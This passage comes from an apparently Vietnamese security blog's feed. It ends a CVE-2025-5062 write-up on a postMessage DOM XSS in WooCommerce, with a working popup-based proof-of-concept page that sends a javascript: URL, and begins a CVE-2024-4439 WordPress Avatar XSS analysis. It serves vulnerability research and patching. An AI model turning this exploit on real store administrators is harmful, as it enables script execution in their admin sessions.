}`&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;&#x9;window.location.href = url.href;&#xA;&#x9;&#x9;&#x9;} catch ( error ) {&#xA;&#x9;&#x9;&#x9;&#x9;// Invalid URL: event.data.url.&#xA;&#x9;&#x9;&#x9;&#x9;captureException( error );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;    }&#xA;    window.addEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;    &#x9;return function removeListener() {&#xA;&#x9;&#x9;window.removeEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;&#x9;};&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.3&amp;rdquo;}&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/dif1.png&#34;&#xA;    alt=&#34;Diff ‚Äî So s√°nh thay ƒë·ªïi m√£ ngu·ªìn gi·ªØa phi√™n b·∫£n vulnerable v√† b·∫£n patched&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff ‚Äî So s√°nh thay ƒë·ªïi m√£ ngu·ªìn gi·ªØa phi√™n b·∫£n vulnerable v√† b·∫£n patched&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tuy ƒë√£ t√¨m ra source v√† sink, nh∆∞ng khi ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa plugin sau khi upload t√¥i l·∫°i kh√¥ng t√¨m ƒë∆∞·ª£c h√†m &lt;code&gt;attachParentListeners()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search1.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ t√¨m ki·∫øm attachParentListeners()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ t√¨m ki·∫øm attachParentListeners()&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;T√¥i nghƒ© m√¨nh ƒë√£ setup sai n√™n code kh√¥ng ƒë∆∞·ª£c t·∫£i v·ªÅ ƒë·∫ßy ƒë·ªß. Nh∆∞ng kh√¥ng, khi t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;&amp;quot;navigate&amp;quot;&lt;/code&gt; t√¥i nh·∫≠n ƒë∆∞·ª£c h√†m kh√°c t√™n c√≥ ch·ª©c nƒÉng t∆∞∆°ng t·ª± &lt;code&gt;attachParentListeners()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search2.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ t√¨m ki·∫øm &amp;rsquo;navigate&amp;#39;&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ t√¨m ki·∫øm &amp;rsquo;navigate&#39;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Trong b·∫£n product, ƒë·ªÉ t·ªëi ∆∞u h√≥a th·ªùi gian t·∫£i d·ªØ li·ªáu v·ªÅ tr√¨nh duy·ªát, plugin ƒë√£ d√πng k·ªπ thu·∫≠t &lt;a href=&#34;https://digitalm.sg/seo-terms/minification/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;minification&lt;/a&gt; lo·∫°i b·ªè kho·∫£ng tr·∫Øng, ƒë·∫∑t t√™n h√†m, bi·∫øn ng·∫Øn v√† m·ªôt ph·∫ßn obfuscation l√†m cho m√£ kh√≥ ƒë·ªçc h∆°n.&lt;/p&gt;&#xA;&lt;p&gt;File ƒë∆∞·ª£c t·∫£i v·ªÅ c√≥ t√™n &lt;code&gt;5292.js&lt;/code&gt; ch·ª© kh√¥ng ph·∫£i &lt;code&gt;utils.js&lt;/code&gt;. Sau khi l√†m ƒë·∫πp code, t√¥i th·∫•y &lt;code&gt;5292.js&lt;/code&gt; ch·ª©a m√£ c·ªßa &lt;code&gt;utils.js&lt;/code&gt; v√† nhi·ªÅu m√£ t·ª´ c√°c file kh√°c.&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p trang &lt;code&gt;customize-store&lt;/code&gt; v√† th·ª≠ g·ª≠i &lt;strong&gt;postMessage&lt;/strong&gt; b·∫±ng console c·ªßa tr√¨nh duy·ªát&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss1.png&#34;&#xA;    alt=&#34;S·ª± ki·ªán alert() khi postMessage t·ª´ console browser&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;S·ª± ki·ªán alert() khi postMessage t·ª´ console browser&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;alert()&lt;/code&gt; ƒë∆∞·ª£c k√≠ch ho·∫°t, s·ª≠ d·ª•ng debug trong tr√¨nh duy·ªát ƒë·ªÉ xem &lt;code&gt;5292.js&lt;/code&gt; ƒë∆∞·ª£c t·∫£i trong tr√¨nh duy·ªát&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/debug1.png&#34;&#xA;    alt=&#34;5292.js t·ª´ debug c·ªßa browser&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;5292.js t·ª´ debug c·ªßa browser&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;event.data&lt;/code&gt; t·ª´ &lt;code&gt;window.postMessage&lt;/code&gt; (c·ª• th·ªÉ &lt;code&gt;event.data.url&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;window.location.href = event.data.url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;T·∫°o trang web v·ªõi m√£ ngu·ªìn sau:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;button id=&amp;#34;openPopup&amp;#34;&amp;gt;Open Popup&amp;lt;/button&amp;gt;&#xA;&#xA;    &amp;lt;script&amp;gt;&#xA;        let popup;&#xA;&#xA;        document.getElementById(&amp;#34;openPopup&amp;#34;).addEventListener(&amp;#34;click&amp;#34;, () =&amp;gt; {&#xA;            // M·ªü popup&#xA;            popup = window.open(&#xA;                &amp;#34;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&amp;#34;, &#xA;                &amp;#34;popupWindow&amp;#34;,&#xA;                &amp;#34;width=400,height=300&amp;#34;&#xA;            );&#xA;&#xA;            // Ch·ªù popup load xong&#xA;            const interval = setInterval(() =&amp;gt; {&#xA;                if (popup &amp;amp;&amp;amp; !popup.closed) {&#xA;                    // G·ª≠i message&#xA;                    popup.postMessage({ type: &amp;#39;navigate&amp;#39;, url: &amp;#39;javascript:alert(\&amp;#34;phu0c ph4m\&amp;#34;)&amp;#39; }, &amp;#39;*&amp;#39;);&#xA;                    clearInterval(interval);&#xA;                }&#xA;            }, 5000);&#xA;        });&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Admin truy c·∫≠p trang web v√† click &lt;code&gt;Open Popup&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau 5s, s·ª± ki·ªán JavaScript ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss2.png&#34;&#xA;    alt=&#34;S·ª± ki·ªán JavaScript t·ª´ popup&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;S·ª± ki·ªán JavaScript t·ª´ popup&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ ƒê√∫ng v·ªõi m√¥ t·∫£ CVE.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Popup kh√¥ng th·ªÉ t·ª± ƒë·ªông k√≠ch ho·∫°t n·∫øu kh√¥ng c√≥ t∆∞∆°ng t√°c c·ªßa ng∆∞·ªùi d√πng&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y, ta kh√¥ng th·ªÉ s·ª≠ d·ª•ng &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; b·ªüi v√¨ &lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt; ƒë∆∞·ª£c set trong response =&amp;gt; ch·ªâ khi c√πng origin m·ªõi nh√∫ng ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/req1.png&#34;&#xA;    alt=&#34;X-Frame-Options: SAMEORIGIN ƒë∆∞·ª£c set trong response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;X-Frame-Options: SAMEORIGIN ƒë∆∞·ª£c set trong response&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-5062&lt;/strong&gt; trong plugin &lt;strong&gt;WooCommerce &amp;lt;= 9.4.2&lt;/strong&gt; l√† &lt;strong&gt;PostMessage-based DOM XSS&lt;/strong&gt;. K·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c c√≥ th·ªÉ g·ª≠i message ƒë·ªôc h·∫°i t·ªõi trang &lt;strong&gt;customize-store&lt;/strong&gt;, khi·∫øn tr√¨nh duy·ªát n·∫°n nh√¢n th·ª±c thi script. B·∫£n v√° &lt;strong&gt;9.4.3&lt;/strong&gt; ƒë√£ ki·ªÉm tra origin, x√°c th·ª±c c·∫•u tr√∫c d·ªØ li·ªáu v√† whitelist URL tr∆∞·ªõc khi redirect.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PostMessage-based DOM XSS&lt;/strong&gt; c√≥ th·ªÉ th·ª±c thi script khi ng∆∞·ªùi d√πng t∆∞∆°ng t√°c (popup/link).&lt;/li&gt;&#xA;&lt;li&gt;D·ªØ li·ªáu t·ª´ &lt;strong&gt;postMessage&lt;/strong&gt; lu√¥n ph·∫£i coi l√† kh√¥ng tin c·∫≠y.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;validate origin, ki·ªÉm tra c·∫•u tr√∫c d·ªØ li·ªáu v√† URL&lt;/strong&gt; tr∆∞·ªõc khi redirect.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫≠p nh·∫≠t plugin&lt;/strong&gt; l√™n b·∫£n v√° m·ªõi nh·∫•t ƒë·ªÉ ngƒÉn khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet ‚Äî PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/woocommerce/vulnerability/wordpress-woocommerce-plugin-9-3-2-9-4-9-4-2-postmessage-based-cross-site-scripting&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce &amp;lt;= 9.3.2 and from 9.4 through 9.4.2 ‚Äî CVE-2025-5062&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-4439 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-09-cve-2024-4439/</link>
      <pubDate>Thu, 09 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-09-cve-2024-4439/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WordPress Core&lt;/strong&gt; d·ªÖ b·ªã &lt;strong&gt;Stored Cross-Site Scripting&lt;/strong&gt; th√¥ng qua t√™n hi·ªÉn th·ªã ng∆∞·ªùi d√πng trong &lt;strong&gt;Avatar block&lt;/strong&gt; ·ªü nhi·ªÅu phi√™n b·∫£n &lt;strong&gt;ƒë·∫øn 6.5.2&lt;/strong&gt; do &lt;strong&gt;insufficient output escaping&lt;/strong&gt; tr√™n &lt;strong&gt;display name&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;authenticated attackers&lt;/strong&gt;, c√≥ quy·ªÅn &lt;strong&gt;contributor-level access&lt;/strong&gt; tr·ªü l√™n, &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; v√†o c√°c trang ‚Äî nh·ªØng script n√†y s·∫Ω &lt;strong&gt;th·ª±c thi&lt;/strong&gt; m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p trang ƒë√£ b·ªã ch√®n. Ngo√†i ra, n√≥ c≈©ng cho ph√©p &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; v√†o nh·ªØng trang c√≥ &lt;strong&gt;comment block&lt;/strong&gt; v√† hi·ªÉn th·ªã &lt;strong&gt;comment author&amp;rsquo;s avatar&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-4439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-4439&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0 - 6.0.7&lt;/li&gt;&#xA;&lt;li&gt;6.1 - 6.1.5&lt;/li&gt;&#xA;&lt;li&gt;6.2 - 6.2.4&lt;/li&gt;&#xA;&lt;li&gt;6.3 - 6.3.3&lt;/li&gt;&#xA;&lt;li&gt;6.4 - 6.4.3&lt;/li&gt;&#xA;&lt;li&gt;6.5 - 6.5.1&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0.8&lt;/li&gt;&#xA;&lt;li&gt;6.1.6&lt;/li&gt;&#xA;&lt;li&gt;6.2.5&lt;/li&gt;&#xA;&lt;li&gt;6.3.4&lt;/li&gt;&#xA;&lt;li&gt;6.4.4&lt;/li&gt;&#xA;&lt;li&gt;6.5.2&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.2 (High)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor+&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Core versions&lt;/strong&gt;: &lt;strong&gt;6.4.3&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;6.4.4&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a 